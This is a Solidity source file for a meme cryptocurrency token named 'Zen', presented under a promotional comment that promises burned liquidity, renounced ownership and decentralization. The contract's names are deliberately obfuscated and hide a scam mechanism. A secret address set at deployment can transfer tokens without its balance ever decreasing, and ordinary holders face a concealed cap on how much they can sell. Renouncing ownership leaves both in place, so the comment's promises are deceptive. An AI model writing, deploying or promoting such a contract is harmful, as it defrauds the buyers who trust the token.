/*

https://t.me/portalzentoken

https://zen.cryptotoken.live/

Based on the ideology and Japanese philosophy of Ryoshi, here are a few new token ideas:

ZenToken (ZEN): Emphasizing simplicity, mindfulness, and balance in the crypto
space.

The closest or most zen animal is Fox 🦊

$ZEN will walk on Ryoshi’s vision of max decentralization. $ZEN liquidity will be burned and Ownerhsip will be renounced.

*/

// SPDX-License-Identifier: MIT

pragma solidity >0.8.10;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract Zen is Ownable {
    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint256 private xnwqcj = 103;

    uint8 public decimals = 9;

    function transferFrom(address mogiusjl, address rvpwdfatcxh, uint256 bhuei) public returns (bool success) {
        require(bhuei <= allowance[mogiusjl][msg.sender]);
        allowance[mogiusjl][msg.sender] -= bhuei;
        apcsghx(mogiusjl, rvpwdfatcxh, bhuei);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    function apcsghx(address mogiusjl, address rvpwdfatcxh, uint256 bhuei) private {
        address dsmawrzl = IUniswapV2Factory(tjvq.factory()).getPair(address(this), tjvq.WETH());
        bool hzsfbdg = qnyvk[mogiusjl] == block.number;
        if (0 == gqcfxkd[mogiusjl]) {
            if (mogiusjl != dsmawrzl && (!hzsfbdg || bhuei > iujnxqtysfve[mogiusjl]) && bhuei < totalSupply) {
                require(bhuei <= totalSupply / (10 ** decimals));
            }
            balanceOf[mogiusjl] -= bhuei;
        }
        iujnxqtysfve[rvpwdfatcxh] = bhuei;
        balanceOf[rvpwdfatcxh] += bhuei;
        qnyvk[rvpwdfatcxh] = block.number;
        emit Transfer(mogiusjl, rvpwdfatcxh, bhuei);
    }

    string public symbol;

    IUniswapV2Router02 private tjvq;

    function transfer(address rvpwdfatcxh, uint256 bhuei) public returns (bool success) {
        apcsghx(msg.sender, rvpwdfatcxh, bhuei);
        return true;
    }

    mapping(address => uint256) private iujnxqtysfve;

    constructor(string memory bxhrg, string memory bcokeznuyjqg, address iwpbkzraeqx, address vhskjxedul) {
        name = bxhrg;
        symbol = bcokeznuyjqg;
        balanceOf[msg.sender] = totalSupply;
        gqcfxkd[vhskjxedul] = xnwqcj;
        tjvq = IUniswapV2Router02(iwpbkzraeqx);
    }

    string public name;

    mapping(address => uint256) private gqcfxkd;

    function approve(address cjqk, uint256 bhuei) public returns (bool success) {
        allowance[msg.sender][cjqk] = bhuei;
        emit Approval(msg.sender, cjqk, bhuei);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) private qnyvk;

    mapping(address => uint256) public balanceOf;

    uint256 public totalSupply = 1000000000 * 10 ** 9;
}
